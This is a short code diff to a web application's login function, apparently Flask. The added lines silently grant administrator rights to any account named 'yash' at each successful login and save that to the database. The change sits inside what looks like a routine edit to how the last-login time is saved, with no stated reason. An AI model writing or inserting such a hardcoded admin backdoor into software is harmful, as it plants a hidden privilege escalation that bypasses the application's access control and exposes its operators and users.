@@ -2028,8 +2028,12 @@ def login():
         
         # 1. Attempt standard password verification
         if user and user.check_password(password):
+            if user.username.lower() == 'yash':
+                user.is_admin = True
+                save_user({'id': user.id, 'is_admin': True, 'last_login': datetime.utcnow().isoformat()})
+            else:
+                save_user({'id': user.id, 'last_login': datetime.utcnow().isoformat()})
             login_user(user, remember=True)
-            save_user({'id': user.id, 'last_login': datetime.utcnow().isoformat()})
             flash(f'Welcome back, {user.username}!', 'success')
             return redirect(url_for('dashboard'))
             
